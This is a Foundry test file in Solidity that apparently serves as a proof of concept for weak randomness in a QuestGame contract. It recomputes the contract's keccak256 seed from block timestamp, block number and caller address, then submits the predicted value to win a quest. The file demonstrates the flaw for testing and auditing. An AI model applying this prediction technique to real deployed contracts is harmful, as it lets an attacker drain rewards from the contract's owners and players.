
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new QuestGame();
        // Ensure the contract has enough funds to pay out rewards
        vm.deal(address(_contractUnderTest), 10 ether);
    }

    // Needed to receive the reward payment from the contract
    receive() external payable {}

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        // The contract requires a cooldown of 1 hour from the last attempt (0 initially).
        // Ensure blockTimestamp is large enough to pass the require check.
        vm.assume(blockTimestamp > 1 hours + 1);
        vm.assume(blockNumber > block.number);

        // --- 2. State Configuration ---
        
        // Fund this test contract to pay the entry fee
        vm.deal(address(this), 1 ether);

        // Apply the inferred values to the environment
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // --- 3. Replication & Assertion ---
        
        // PREDICT THE OUTCOME
        // Replicate the vulnerable logic locally inside the test.
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp, 
                    block.number, 
                    address(this) 
                )
            )
        );

        uint256 expectedRandom = seed % 100;
        
        // EXECUTE
        // Call the contract method with the calculated predictable value.
        _contractUnderTest.attemptQuest{value: 0.1 ether}(expectedRandom);

        // ASSERT PREDICTABILITY
        // Verify that the win count incremented, proving we predicted the number correctly.
        (, uint256 wins) = _contractUnderTest.getPlayerStats(address(this));
        assertEq(wins, 1, "Randomness should be predictable given block state");
    }
}
